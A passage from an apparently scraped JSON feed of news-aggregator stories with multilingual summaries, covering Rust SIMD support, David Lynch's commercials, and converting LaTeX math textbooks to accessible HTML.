applications, I am not personally very excited about it for my applications.\nFor one, because it emphasizes portability, it encourages a \"lowest common denominator\" approach, while I believe that for certain use cases it will be important to tune algorithms to best use the specific quirks of the different SIMD implementations.\nFor two, std::simd does not itself solve the multiversion problem.\nFrom my perspective, it's probably best to consider it as a souped-up version of autovectorization.\nLanguage evolution\nRust's out of the box support for SIMD is still quite rough, especially the need to use unsafe extensively.\nWhile some of the gap can be filled with libraries, arguably it should be a goal of the language itself to support safe SIMD code.\nThere is progress in this direction.\nFirst, the original version of target_feature requires unsafe to call into any function annotated with #[target_feature].\nA proposal to relax that so that functions already under a target_feature gate can call safely call into another function with the same gate is called \"target_feature 1.1\" and is scheduled to ship in 1.86.\nClosely related, once inside the suitable target_feature gate, the majority of SIMD intrinsics (broadly, those that don't do memory access through pointers) should be considered safe by the compiler, and that feature (safe intrinsics in core::arch) is also in flight.\nThere's more that can be done to help the Rust compiler recognize when SIMD use is safe, in particular to allow target_features when a concrete witness to the SIMD level is passed in as a function argument.\nThe \"struct target_features\" proposal (RFC 3525) enables target_feature in such cases, and is one of the proposals considered in the proposed Rust project goal Nightly support for ergonomic SIMD multiversioning.\nIn general, improving Rust SIMD support will require both libraries and support in the Rust language.\nDifferent approaches at the library level may indicate different language features to best support them.\nLooking forward\nMy main goal in putting these prototypes forward, as well as writing these blog posts, is to spark conversation on how best to support SIMD programming in Rust.\nIf done well, it is a great opportunity for the language, and fits in with its focus on performance and portability.\nAs we build out the Vello hybrid CPU/GPU renderer, performance of the CPU components will rely heavily on SIMD, so we need to invest in writing a lot of SIMD code.\nThe most conservative approach would be hand-writing unsafe intrinsics-based code for all targets, but that's a lot of work and the use of unsafe is unappealing.\nI'd love for the Rust ecosystem can come together and build good infrastructure, competitive with Highway.\nFor now, I think it's time to carefully consider the design space and try to come to consensus on what that should look like.",
    "summary": {
      "en": "### Summary of \"Towards Fearless SIMD, 7 Years Later\"\n\nIn March 2025, Raph Levien revisits his earlier vision for improving SIMD (Single Instruction, Multiple Data) programming in Rust. Although there has been some progress, writing SIMD in Rust remains challenging. The need for SIMD is highlighted by new projects using CPU/GPU hybrid rendering techniques.\n\nA key issue is that SIMD intrinsics in Rust are marked as unsafe due to the varying support across CPUs. This means developers must ensure the CPU can handle SIMD instructions, which complicates code safety.\n\nLevien provides examples of computing a sigmoid function using SIMD, showcasing the complexity of writing safe and efficient SIMD code. He discusses multiversioning, which allows the same code to run optimally on different CPU architectures, but notes that Rust lacks robust solutions compared to libraries like Highway in C++.\n\nThe article also touches on the trends in SIMD, such as the growing use of smaller scalar types like FP16 for better performance, and mentions upcoming features in Intel's AVX10. Additionally, he discusses the ongoing development of the `std::simd` library, though he expresses concerns about its focus on portability over performance optimization.\n\nLevien emphasizes the need for Rust to improve its SIMD support, making it safer and more ergonomic, and encourages community discussion on how to achieve this. He believes that enhancing SIMD capabilities in Rust is crucial for the language's performance and usability in future projects.",
      "ko": "2025년 3월, 래프 레비엔은 러스트에서 SIMD(단일 명령, 다중 데이터) 프로그래밍을 개선하기 위한 자신의 초기 비전을 다시 살펴봅니다. 일부 진전이 있었지만, 러스트에서 SIMD를 작성하는 것은 여전히 어려운 과제로 남아 있습니다. CPU와 GPU를 혼합한 렌더링 기술을 사용하는 새로운 프로젝트들이 등장하면서 SIMD의 필요성이 더욱 부각되고 있습니다.\n\n주요 문제 중 하나는 러스트의 SIMD 내장 함수가 CPU마다 지원이 다르기 때문에 안전하지 않은 것으로 표시된다는 점입니다. 이는 개발자가 CPU가 SIMD 명령어를 처리할 수 있는지 확인해야 함을 의미하며, 코드의 안전성을 복잡하게 만듭니다.\n\n레비엔은 SIMD를 사용하여 시그모이드 함수를 계산하는 예를 제공하며, 안전하고 효율적인 SIMD 코드를 작성하는 복잡성을 보여줍니다. 그는 멀티버전화에 대해 논의하며, 동일한 코드가 다양한 CPU 아키텍처에서 최적의 성능을 발휘할 수 있도록 하는 방법을 설명하지만, 러스트는 C++의 하이웨이와 같은 라이브러리에 비해 강력한 솔루션이 부족하다고 지적합니다.\n\n이 글은 또한 SIMD의 트렌드에 대해 다루며, 성능 향상을 위해 FP16과 같은 더 작은 스칼라 타입의 사용이 증가하고 있음을 언급하고, 인텔의 AVX10에서 곧 출시될 기능에 대해서도 이야기합니다. 더불어 `std::simd` 라이브러리의 지속적인 개발에 대해서도 논의하지만, 성능 최적화보다 이식성에 중점을 두고 있는 점에 대한 우려를 표명합니다.\n\n레비엔은 러스트가 SIMD 지원을 개선하여 더 안전하고 사용하기 편리하게 만들어야 한다고 강조하며, 이를 달성하기 위한 커뮤니티의 논의를 촉구합니다. 그는 러스트에서 SIMD 기능을 강화하는 것이 향후 프로젝트의 성능과 사용성을 위해 매우 중요하다고 믿고 있습니다.",
      "ja": "2025年3月、ラフ・レビエンは、RustにおけるSIMD（単一命令・複数データ）プログラミングの改善に関する以前のビジョンを再検討しました。進展はあったものの、RustでのSIMDの記述は依然として難しいままです。SIMDの必要性は、CPUとGPUを組み合わせたレンダリング技術を使用する新しいプロジェクトによって強調されています。\n\n重要な問題の一つは、RustのSIMD命令がCPUによって異なるサポート状況のために「unsafe」とマークされていることです。これにより、開発者はCPUがSIMD命令を処理できることを確認する必要があり、コードの安全性が複雑になります。\n\nレビエンは、SIMDを使用してシグモイド関数を計算する例を示し、安全で効率的なSIMDコードを書くことの複雑さを浮き彫りにしています。また、異なるCPUアーキテクチャで同じコードが最適に動作するようにする「マルチバージョニング」についても言及していますが、RustはC++のHighwayのようなライブラリに比べて堅牢な解決策が不足していると指摘しています。\n\n記事では、FP16のような小さなスカラー型の使用が増えていることや、IntelのAVX10に関する今後の機能についても触れています。さらに、`std::simd`ライブラリの開発が進行中であることを述べつつ、パフォーマンス最適化よりもポータビリティに焦点を当てていることに懸念を示しています。\n\nレビエンは、RustがSIMDサポートを改善し、安全で使いやすくする必要があると強調し、これを達成するためのコミュニティの議論を促しています。彼は、RustにおけるSIMD機能の強化が、将来のプロジェクトにおける言語のパフォーマンスと使いやすさにとって重要であると考えています。"
    }
  },
  {
    "id": "a9c10bd2b59ddc15",
    "title": {
      "en": "Atop 2.11 heap problems",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://openwall.com/lists/oss-security/2025/03/29/1",
    "score": 93,
    "by": "baggy_trough",
    "time": 1743281022,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "845551732f95874d",
    "title": {
      "en": "Commercials that David Lynch directed (2018)",
      "ko": "린치의 광고 세계",
      "ja": "リンチのCM集"
    },
    "type": "story",
    "url": "https://www.openculture.com/2018/07/watch-commercials-david-lynch-directed-big-30-minute-compilation.html",
    "score": 95,
    "by": "bookofjoe",
    "time": 1743280281,
    "content": "Some film­mak­ers start in com­mer­cials, hon­ing their chops in antic­i­pa­tion of mak­ing per­son­al projects lat­er. A select few go in the oth­er direc­tion, real­iz­ing their dis­tinc­tive vision before field­ing offers from com­pa­nies who want a piece of that vision’s cul­tur­al cur­ren­cy. Any­one who’s seen David Lynch’s most acclaimed workwill sus­pect, cor­rect­ly, that Lynch belongs in the lat­ter group. With 1977’s cult hitEraser­head, he showed cin­e­ma what it means to be Lynchi­an. This brought him the atten­tion of Hol­ly­wood, lead­ing to the respectable suc­cess ofThe Ele­phant Manandthe dis­as­ter that wasDune. Only in 1986, withBlue Vel­vet, could Lynch make a tru­ly, even trou­bling­ly per­son­al film that hit the zeit­geist at just the right moment.\nNat­u­ral­ly, Madi­son Avenue came call­ing soon there­after. “With the smash Blue Vel­vet, a Palme d’or at Cannes for Wild at Heart, and then the nation­al phe­nom­e­non of Twin Peaks’ first sea­son, David Lynch clear­ly estab­lished him­self as the U.S.A.‘s fore­most com­mer­cial­ly viable avant-garde-‘offbeat’ direc­tor,” wrote David Fos­ter Wal­lace in a 1997 piece on the film­mak­er.\n\n“For a while there it looked like he might be able to sin­gle-hand­ed­ly bro­ker a new mar­riage between art and com­merce in U.S. movies, open­ing for­mu­la-frozen Hol­ly­wood to some of the eccen­tric­i­ty and vig­or of art film.”Lynch’s fans in tele­vi­sion adver­tis­ing must have imag­ined that he could do the same for their indus­try, and you can watch the fruits of that hunch in the half-hour com­pi­la­tion of Lynch-direct­ed com­mer­cials above.\nLynch has worked for some star­tling­ly big brands, begin­ning with Calvin Klein: his trio of spots for the fra­granceObses­sion take as their basis the writ­ing of F. Scott Fitzger­ald, Ernest Hem­ing­way, and D.H. Lawrence. A few years lat­er he direct­ed a humor­ous mini-sea­son of Twin Peaks to pro­mote Geor­gia Cof­fee, one of the top brands of canned cof­fee in theLynch-lov­ing coun­try ofJapan. The New York Depart­ment of San­i­ta­tion engaged Lynch’s ser­vices to imbue their anti-lit­ter­ing cam­paign with his sig­na­ture high-con­trast omi­nous­ness, a mood also sought by fash­ion-indus­try titans like Armani, Yves Saint Lau­rent, Guc­ci, and Dior. The mar­keters of hum­bler goods like Alka-Seltzer, Bar­il­la Pas­ta (a seem­ing­ly auteur-aware brand that has also hired Wim Wen­ders and Felli­ni), and Clear Blue Easy home preg­nan­cy tests have also gone in for a touch of the Lynchi­an.\nQuite a few of these com­mer­cials orig­i­nal­ly aired only out­side Amer­i­ca, which may reflect the sup­pos­ed­ly more endur­ing appre­ci­a­tion of Lynch’s work that exists in Europe and Asia. But for all Lynch’s artis­tic dar­ing, the man him­self has always come off as an enthu­si­ast of unre­con­struct­ed Amer­i­can plea­sures. To this day he remains a stead­fast smok­er, and in 1998 brought that per­son­al cred­i­bil­i­ty to the Swiss cig­a­rette brand Parisi­enne. The result­ing spot fea­tures men in ties, show­ers of sparks, dead fish, back­wards talk­ing, a for­bid­ding­ly illu­mi­nat­ed shack, and apoc­a­lyp­tic flames:Parisi­enne, in oth­er words, must have got exact­ly what they paid for.\nRelat­ed Con­tent:\nWhat Makes a David Lynch Film Lynchi­an: A Video Essay\nDavid Lynch Made a Dis­turb­ing Web Sit­com Called “Rab­bits”: It’s Now Used by Psy­chol­o­gists to Induce a Sense of Exis­ten­tial Cri­sis in Research Sub­jects\nThe Sur­re­al Film­mak­ing of David Lynch Explained in 9 Video Essays\nWim Wen­ders Cre­ates Ads to Sell Beer (Stel­la Artois), Pas­ta (Bar­il­la), and More Beer (Car­ling)\nSpike Jonze’s Imag­i­na­tive TV Ads\nFellini’s Fan­tas­tic TV Com­mer­cials\nIng­mar Bergman’s 1950s Soap Com­mer­cials Wash Away the Exis­ten­tial Despair\nBased in Seoul,Col­in Mar­shallwrites and broad­castson cities and cul­ture.His projects include the bookThe State­less City: a Walk through 21st-Cen­tu­ry Los Ange­lesand the video seriesThe City in Cin­e­ma. Fol­low him on Twit­ter at@colinmarshallor onFace­book.",
    "summary": {
      "en": "Some filmmakers start by making commercials before moving on to personal projects, while others, like David Lynch, gain recognition through their unique artistic visions early on. Lynch became famous with his 1977 film \"Eraserhead,\" which led to Hollywood opportunities, including the successful \"The Elephant Man\" and the less successful \"Dune.\" His 1986 film \"Blue Velvet\" was a personal success that resonated with audiences, and soon after, he was sought after for commercials.\n\nLynch worked with major brands like Calvin Klein, directing ads that drew from classic literature, and created a humorous mini-series of \"Twin Peaks\" to promote Georgia Coffee in Japan. He also collaborated on campaigns for the New York Department of Sanitation and high-end fashion brands like Armani and Dior. Many of his commercials aired primarily outside the U.S., reflecting his broader appeal in Europe and Asia.\n\nDespite his artistic edge, Lynch enjoys classic American pleasures, as shown in his 1998 ad for a Swiss cigarette brand, which featured his signature surreal style.",
      "ko": "일부 영화 제작자들은 개인 프로젝트로 넘어가기 전에 광고를 제작하는 것으로 시작합니다. 반면, 데이비드 린치와 같은 이들은 독특한 예술적 비전을 통해 일찍이 인정을 받습니다. 린치는 1977년 영화 \"이레이저헤드\"로 유명해졌고, 이 영화는 할리우드에서의 기회를 가져왔습니다. 그는 성공적인 \"엘리펀트 맨\"과 덜 성공적인 \"듄\"과 같은 작품을 만들었습니다. 1986년의 \"블루 벨벳\"은 관객들에게 큰 호응을 얻으며 개인적인 성공을 거두었고, 이후 광고 제작 요청이 이어졌습니다.\n\n린치는 칼빈 클라인과 같은 주요 브랜드와 협력하여 고전 문학에서 영감을 받은 광고를 감독했습니다. 그는 일본에서 조지아 커피를 홍보하기 위해 유머러스한 미니 시리즈 \"트윈 픽스\"를 제작하기도 했습니다. 또한 뉴욕 위생국과 아르마니, 디올과 같은 고급 패션 브랜드의 캠페인에도 참여했습니다. 그의 많은 광고는 주로 미국 외에서 방영되었으며, 이는 그가 유럽과 아시아에서 더 넓은 매력을 가지고 있음을 보여줍니다.\n\n예술적인 경향에도 불구하고, 린치는 고전적인 미국의 즐거움을 즐깁니다. 1998년 스위스 담배 브랜드를 위한 광고에서도 그의 독특한 초현실적 스타일이 드러났습니다.",
      "ja": "映画製作者の中には、最初にコマーシャルを制作してから個人プロジェクトに移る人もいれば、デヴィッド・リンチのように独自の芸術的ビジョンで早くから注目を浴びる人もいます。リンチは1977年の映画「イレイザーヘッド」で有名になり、その後ハリウッドでの機会を得ました。成功を収めた「エレファント・マン」や、あまり成功しなかった「デューン」などがその例です。1986年の映画「ブルーヴェルベット」は彼にとって個人的な成功を収め、観客に強く響きました。その後、彼はコマーシャルの制作にも引っ張りだこになりました。\n\nリンチはカルバン・クラインなどの大手ブランドと協力し、古典文学を取り入れた広告を制作しました。また、日本ではジョージアコーヒーのために「ツイン・ピークス」のユーモラスなミニシリーズを作成しました。さらに、ニューヨーク市の衛生局やアルマーニ、ディオールといった高級ファッションブランドのキャンペーンにも参加しました。彼のコマーシャルの多くは主にアメリカ以外で放送され、ヨーロッパやアジアでの広い人気を反映しています。\n\n芸術的なセンスを持ちながらも、リンチはアメリカのクラシックな楽しみを好んでいます。1998年に制作したスイスのタバコブランドの広告では、彼の特徴的なシュールなスタイルが表現されています。"
    }
  },
  {
    "id": "d4ccda5cec78dfd4",
    "title": {
      "en": "Convert Linux to Windows",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://philipbohun.com/blog/0007.html",
    "score": 71,
    "by": "pbohun",
    "time": 1743284042,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c3248b8e7af279fd",
    "title": {
      "en": "Accessible open textbooks in math-heavy disciplines",
      "ko": "수학 교과서의 접근성",
      "ja": "数学のオープン教科書"
    },
    "type": "story",
    "url": "https://richardzach.org/2025/03/accessible-open-textbooks-in-math-heavy-disciplines/",
    "score": 154,
    "by": "volemo",
    "time": 1743266281,
    "content": "2025-03-242025-03-26 rzach\n\n\t\tAccessible Open Textbooks in Math-Heavy Disciplines\n\nThe challenge\n\nThe authoring platform of choice in many math-heavy disciplines is LaTeX. It produces typeset documents of excellent quality and handles formulas and mathematical diagrams extremely well. Practically every researcher or instructor in mathematics, physics, and computer science is adept at using it, and it has a wide user base outside these core disciplines as well (e.g., philosophy and economics).\n\nUnfortunately, it only produces PDF output. PDF is not an accessible format: it does not scale well to display on tablets or phones, text does not reflow, it contains no semantic information (e.g., what’s a heading or what’s a list), images, formulas, and diagrams are only visually accessible. This creates difficulties for readers who rely on alternative presentations of material (in other colors, text sizes, fonts, or in non-visual formats, i.e., audio or Braille) or who simply want to access the material on a device not the size of a printed page (e.g., on a smartphone or small e-reader).\n\nA partial solution is to provide the content in HTML. HTML deals with accessibility much better than PDF, and technology that converts HTML to other formats is widely available. HTML is also accessible to screen reader software specifically designed for users with low or no vision, and simpler text-to-speech (TTS) software which many sighted users also rely on (e.g., those with dyslexia or ADHD). In math-heavy disciplines, the widespread reliance on LaTeX and PDF only for producing OERs poses a unique challenge (e.g., only about half of the textbooks on the American Institute for Mathematics list are provided in HTML).\n\nThe availability of material in HTML format to ensure accessibility is a desideratum for all OER. For math-heavy disciplines, the presentation of mathematical formulas in an HTML version of the material poses a second and difficult challenge. Mathematical formulas have long caused problems for display on web pages. Early solutions included displaying pictures or recreating formulas as text with special formatting and fonts. The modern solution is MathML, a special format for representing mathematical formulas that can be included in HTML documents. MathML is not universally supported by web browsers. The most widespread solution is for a webpage to include the polyfill browser extension MathJax in the webpage, which displays MathML to the user. MathML is a low-level format and not a suitable format for humans to write formulas in. However, good conversion utilities from LaTeX formula notation to MathML exist, and MathJax can also directly display LaTeX formulas embedded in webpages. For instance, the code \\int_{x=0}^\\infty \\frac{1}{x^2} dx produces: $$\\int_{x=0}^\\infty \\frac{1}{x^2}$$ whereas the MathML representation is unintelligble (right-click on the formula, select “Show Math As > MathML Code” to see it). MathJax can display the formulas itself, display the LaTeX code used to generate it, or produce code in some other format that it lets the browser render (e.g., MathML, HTML, or SVG; right-click on the formula, select “Math Settings > Math Renderer” to see the differences).\n\nAlternatives to LaTeX\n\nOne option is to avoid LaTeX as the authoring platform from the start, or to convert existing LaTeX code to a format that is itself more easily converted into HTML. The following are three options, which all allow the use of LaTeX notation for entering mathematical symbols and formulas.\n\nPressbooks is a web-based authoring and publishing tool for OERs, which supports LaTeX formulas and support for export to PDF for printing. It is built on top of WordPress, so in a sense it is web-first. While it is possible to use mathematical formulas in a Pressbooks project, it is not a popular option for math-heavy disciplines. Example: A Concise Introduction to Logic (note that formal proofs are displayed as images, images have no ALT tags, and stand-alone formulas don’t use MathML or even unicode characters, e.g., the logical and symbol is presented as a caret ^ and the logical or as the letter “v”).\n\nPreTeXt is a platform for authoring mathematics textbooks in XML, and converts the XML source to other formats (including LaTeX for printing, HTML for display on a web browser, and ePub for display on e-readers such as Kindle). PreTeXt is one of the oldest open publishing solutions and popular with with mathematicians. For open textbooks, free help for conversion to PreTeXt is available. Example: Abstract Algebra\n\nMarkdown is a simple markup language that can easily be converted to other formats (including HTML, LaTeX, PDF, and Word) using the pandoc package. R Markdown (and its extension/successor Quarto) and Bookdown are popular interfaces for authoring and publishing Markdown documents (and use pandoc and LaTeX “under the hood”). Mathematical formulas and symbols can be included using simplified LaTeX code. Because of the close connection to the statistics package R, this option is popular with statisticians, economists, psychologists, and data scientists. Examples, e.g.: Modern Statistical Methods for Psychology, Odds & Ends\n\nAll of the above come with advantages and drawbacks. Depending on the scope and complexity of the project, and the functionality required, converting an existing project to, e.g., Markdown or PreTeXt may be a viable option, and should be considered especially for new projects. A significant advantage of Markdown is that it can be easily converted to other formats (including LaTeX).\n\nAn obvious barrier to use of the above is that authors have to learn a new system and/or language and the use of unfamiliar tools. A more significant disadvantage is that the LaTeX ecosystem is huge. LaTeX (or at least its predecessor, TeX) has been around for almost half a century. There are numerous packages that aid in the production of documents, from sophisticated citation managers to packages for the production of specialized diagrams and complex layout of mathematical formulas. LaTeX is also easily extensible; authors can define their own macros quite easily. Very few of these features are available to documents authored in Markdown or PreTeXt, and almost none in Pressbooks. Converting an entire existing textbook will usually require a substantial amount of work, in part because many things that LaTeX does easily will have to be recreated from scratch.\n\nLaTeX to HTML conversion\n\nA second option is to use software to automatically convert a LaTeX project to HTML. Because of the complexity and variability of LaTeX projects, there are few good conversion utilities. The solution I prefer is LaTeXML. It is a reimplementation of LaTeX, but outputs to XML instead of to PDF, and can compile mathematical formulas to MathML. LaTeXML is what ar5iv uses: a project to compile everything on the arXiv to HTML.\n\nBecause LaTeXML simulates what LaTeX is actually doing, it can (to a large extent) deal with packages and LaTeX programming directly. It does natively support a large number of popular packages and classes, but packages it does not support can be loaded and “compiled” using the --includestyles flag. This support is not perfect (e.g., many newer packages that rely in turn on the expl3 package cannot yet be compiled.) LaTeXML is under active development and is likely to keep improving and be supported for the foreseeable future. In any case, because many commonly used packages are supported already or work with the --includestyles flag, LaTeXML is probably the best candidate for a tool to convert an existing LaTeX project to HTML.\n\nThe output produced by LaTeXML directly is not terribly visually appealing. Since the HTML output will  not just be used by screen readers (where visual presentation is secondary), some effort is required to style the HTML produced by LaTeXML using CSS to produce webpages that look attractive and display well on a range of devices and browsers (i.e., responsive web pages).\n\nOne available and simple solution is BookML, developed by mathematician Vincenzo Mantova at the University of Leeds. BookML uses LaTeXML to produce webpages that use a style modified from that used by Bookdown. LaTeXML and BookML provide additional features to authors to provide different code depending on whether LaTeX is used to produce a PDF, or LaTeXML to produce HTML. BookML extends this capability, e.g., by adding the possibility of directly adding HTML code into the webpages produced, or adding alt text to images produced other than by LaTeX’s \\includegraphics command. BookML also automatically produces a SCORM bundle of the project that can be uploaded to a learning management system (such as Brightspace, Canvas, or Moodle). This is especially useful for authors who don’t have an easy way of hosting the resulting website on a server. LaTeXML (but not yet BookML) can also produce ePub.\n\nCase study: An open textbook on formal logic\n\nThe University of Calgary Department of Philosophy teaches symbolic logic in its PHIL 279 course to over 700 students (mainly Computer Science majors). With support from the Taylor Institute for teaching and Learning, we adapted the open textbook forall x by P.D. Magnus; the resulting open textbook forall x: Calgary has been in use in PHIL 279 since 2017. The Calgary version is now also widely adopted and has been translated to German and Portuguese.\n\nI converted this text to HTML in 2024 using LaTeXML and BookML. The basic (error-free) conversion to HTML was simple, and required about a day of work. It involved mainly changing bits of LaTeX code that LaTeXML couldn’t handle. Approximately another week of work was required to fine-tune the LaTeX code and CSS so that it produced better HTML and visual output. E.g., markup to produce lists sometimes resulted in odd spacing on the resulting web page. LaTeX’s mechanisms for producing links also sometimes didn’t work (produced incorrect links or link text when run through LaTeXML). Many of these issues were caused by oddities of the legacy LaTeX code from which we started, and wouldn’t be necessary for a LaTeX project with clean source code that uses standard packages.\n\nThe impetus for carrying out the conversion was a request from the University of Cincinnati Accessibility Center who needed to accommodate a blind student in a course using this textbook. I took this as an opportunity to make the HTML version as accessible as possible, specifically, to make it work well with screen readers.\n\nAdd ALT text to all diagrams and images.\n\nProvide accessible alternatives to some text elements (e.g., we use a long underline to indicate a blank in a sentence, but this long underline cannot be interpreted by screen readers).\n\nSwitch the language on foreign terms and names so that screen readers can pronounce them in the right voice.\n\nDevelop a non-visual representation of formal proofs and rewrite the code to produce them so that LaTeXML and BookML could a) display them on the HTML version cleanly using CSS and b) screen readers could provide the missing visual information in textual (i.e., auditory) form. The proofs in PDF are produced with the fitch package. When run through LaTeXML/BookML they are produced using fitchml.sty and styled with CSS with fitchml.css in the project source. The non-visual presentation is described in the accessibility notes for forall x. (Thanks to Patrick Girard and Audrey Yap for discussions on how to present proofs non-visually. The image at the top of this post is an example.)\n\nThere is still work to be done, and the results haven’t been tested by actual students with low or no vision, on their own or in the context of using the materials in a course.\n\nPitfalls and tricks\n\nIt is difficult to test web versions of OER for accessibility. There are basic tools (e.g., WAVE) that automatically check for various things, e.g., that contrast and colors are suitable for colorblind readers, images have ALT tags, etc. Code produced by LaTeXML generally does well on everything that can be automatically checked (the developers have accessibility in mind), and anything the available resources for OER authors provide guidance on (e.g., the BCcampus Open Accessibility Toolkit). But detailed testing is a challenge for an author with no accessibility training or experience.\n\nWhat might work in the screen reader you have (say, VoiceOver on MacOS or Narrator on Windows) may not work with others, may work on one version but not others, and any hacks used to make it work might break on others. Testing on a wide range of assistive technologies for non-experts is near impossible: you’d need several different computers and ability to install various assistive technologies on them, some of them are not free. Testing Braille requires at least knowledge of Braille if not separate hardware.\n\nThat said, it’s usually best to use documented best practice. (E.g., I originally used the aria-label tag to provide explicit hints for how things should be pronounced. But support of aria-label is inconsistent.)\n\nI felt pulled in competing directions when fine-tuning code and deciding on various settings, between providing an optimal experience for readers using TTS extensions casually and not degrading the experience for users relying on true screen readers like JAWS and NVDA. TTS extensions tend to have poor support for pronouncing unicode characters, MathML with assistive alternative text, and tables. Dong things one way might get VoiceOver on Macs or Windows Narrator to read out formulas and special symbols, but then prevent NVDA from working properly. I also had a hard time maneuvering accessibility advice and was unable to obtain advice or support from on-campus sources like our accessibility service center.\n\nTricking screen readers into pronouncing things the right way is in any case a fool’s errand and may have unintended side effects. (See The Curious Case of “iff” and Overriding Screenreader Pronunciations by Ben Myers). It’s usually best to “leave things be” but provide guidance in a page on accessibility (here is the one for forall x). Screen reader users are accustomed to changing the settings of their preferred software to fix things. You can help by letting them know what to watch for. A good screen reader can replace text with other text that produces better pronunciation. E.g., depending on the voice synthesizer, the letter “A” in a formula might be pronounces as a schwa (i.e., like “uh”). MathJax will tell the screen reader to read a symbol “A” as “upper A”, and the user can replace this everywhere with “upper Eh”.\n\nLinks\n\nAccessible Mathematics\n\nConverting LaTeX to HTML: technical notes\n\nTeaching logic to blind students\n\nSample output of forall x with screen readers:\n\nNVDA\n\nWindows Narrator\n\nShare this:Click to share on Mastodon (Opens in new window)Click to share on Facebook (Opens in new window)Click to share on Reddit (Opens in new window)Click to share on Pocket (Opens in new window)Click to share on Twitter (Opens in new window)Click to email a link to a friend (Opens in new window)Click to print (Opens in new window)\n\n\t\tPosted in Progress, Uncategorized2 Comments",
    "summary": {
      "en": "**Summary: Accessible Open Textbooks in Math-Heavy Disciplines**\n\nThe main issue is that LaTeX, a popular tool for creating high-quality documents in math-heavy fields, only outputs in PDF format, which is not accessible for many users. PDFs can’t be easily adjusted for different devices or formats, and they don't provide necessary semantic information for screen readers.\n\nA better solution is to use HTML, which is more accessible and works well with assistive technologies. However, displaying mathematical formulas in HTML can be challenging. MathML is a format designed for this purpose but isn't fully supported by all web browsers. MathJax can help display these formulas correctly on web pages.\n\nAlternatives to LaTeX include:\n\n1. **Pressbooks**: A web-based tool that supports LaTeX but is not widely used in math-heavy fields.\n2. **PreTeXt**: An XML-based platform that converts content into multiple formats, including HTML and LaTeX.\n3. **Markdown**: A simple markup language that can be easily converted to various formats and is popular in disciplines like statistics.\n\nEach alternative has pros and cons, especially concerning the complexity of existing LaTeX projects. A significant barrier is that authors need to learn new tools and languages, unlike LaTeX, which has a vast ecosystem of features.\n\nAnother option is to convert existing LaTeX documents to HTML using tools like LaTeXML, which is effective but requires additional work to make the output visually appealing. BookML can enhance this process by providing styling options and features for online learning systems.\n\nA case study from the University of Calgary shows how an open textbook was successfully adapted for accessibility, which involved converting LaTeX to HTML and ensuring compatibility with screen readers.\n\nTesting for accessibility can be difficult, and while many automated tools exist, thorough testing often requires expertise and resources. The author faced challenges in balancing accessibility features for different screen readers and user needs.\n\nOverall, the document emphasizes the importance of making math-heavy educational resources accessible and the challenges involved in achieving this goal.",
      "ko": "주요 문제는 수학 중심 분야에서 고품질 문서를 만드는 데 널리 사용되는 LaTeX가 PDF 형식으로만 출력된다는 점입니다. PDF는 다양한 기기나 형식에 맞게 쉽게 조정할 수 없으며, 화면 읽기 프로그램을 위한 필수적인 의미 정보를 제공하지 않습니다.\n\n더 나은 해결책은 HTML을 사용하는 것입니다. HTML은 접근성이 더 좋고 보조 기술과 잘 작동합니다. 그러나 HTML에서 수학 공식을 표시하는 것은 어려울 수 있습니다. MathML은 이를 위해 설계된 형식이지만 모든 웹 브라우저에서 완전히 지원되지 않습니다. MathJax는 웹 페이지에서 이러한 공식을 올바르게 표시하는 데 도움을 줄 수 있습니다.\n\nLaTeX의 대안으로는 다음과 같은 것들이 있습니다. Pressbooks는 LaTeX를 지원하는 웹 기반 도구이지만 수학 중심 분야에서는 널리 사용되지 않습니다. PreTeXt는 XML 기반 플랫폼으로, 콘텐츠를 HTML과 LaTeX를 포함한 여러 형식으로 변환합니다. Markdown은 다양한 형식으로 쉽게 변환할 수 있는 간단한 마크업 언어로, 통계학과 같은 분야에서 인기가 있습니다.\n\n각 대안은 장단점이 있으며, 특히 기존 LaTeX 프로젝트의 복잡성과 관련하여 어려움이 있습니다. 저자들은 LaTeX와 같은 방대한 기능 생태계가 없는 새로운 도구와 언어를 배워야 하는 큰 장벽에 직면해 있습니다.\n\n또 다른 옵션은 LaTeXML과 같은 도구를 사용하여 기존 LaTeX 문서를 HTML로 변환하는 것입니다. 이 방법은 효과적이지만 출력물을 시각적으로 매력적으로 만들기 위해 추가 작업이 필요합니다. BookML은 온라인 학습 시스템을 위한 스타일 옵션과 기능을 제공하여 이 과정을 개선할 수 있습니다.\n\n캘거리 대학교의 사례 연구에서는 LaTeX를 HTML로 변환하고 화면 읽기 프로그램과의 호환성을 보장하여 접근성을 위해 열린 교과서를 성공적으로 조정한 방법을 보여줍니다.\n\n접근성 테스트는 어려울 수 있으며, 많은 자동화 도구가 존재하지만 철저한 테스트는 종종 전문 지식과 자원을 요구합니다. 저자는 다양한 화면 읽기 프로그램과 사용자 요구에 맞춰 접근성 기능의 균형을 맞추는 데 어려움을 겪었습니다.\n\n전반적으로 이 문서는 수학 중심 교육 자료의 접근성을 높이는 것의 중요성과 이를 달성하는 데 수반되는 도전 과제를 강조합니다.",
